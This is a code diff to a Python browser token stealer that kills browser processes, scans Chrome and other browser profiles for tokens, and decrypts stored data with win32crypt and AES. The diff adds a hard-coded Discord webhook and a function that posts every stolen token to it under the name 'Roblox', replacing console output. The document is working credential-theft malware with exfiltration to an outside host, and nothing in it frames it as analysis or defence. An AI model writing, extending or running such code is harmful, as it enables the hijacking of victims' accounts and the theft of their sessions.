@@ -7,9 +7,11 @@ import psutil
 import win32crypt
 from Crypto.Cipher import AES
 import time
+import requests
 
 ROAMING = os.getenv("APPDATA")
 LOCAL = os.getenv("LOCALAPPDATA")
+WEB_HOOK = "https://discordapp.com/api/webhooks/1467790287593013311/umt0amzFufQhPgsLRn9hS97-ktNwmNJeoAjavHi3Y10Nne_-ejSdZ5RNyOvY7RzuATnS"
 
 PATHS = {
     'Chrome': LOCAL + r'\Google\Chrome\User Data',
@@ -123,6 +125,14 @@ def kill_browser_processes():
     else:
         pass
 
+def dis(token):
+    payload = {
+        "username": "Roblox",
+        "content": str(token)                   
+    }
+    
+    req = requests.post(WEB_HOOK, json=payload)
+
 if __name__ == "__main__":
     kill_browser_processes()
     tokens = scan_browsers()
@@ -130,7 +140,5 @@ if __name__ == "__main__":
     if not tokens:
         pass
     else:
-        print("\nToken Found: ")
         for token in tokens:
-            print(token)
-        print()
+            dis(token)
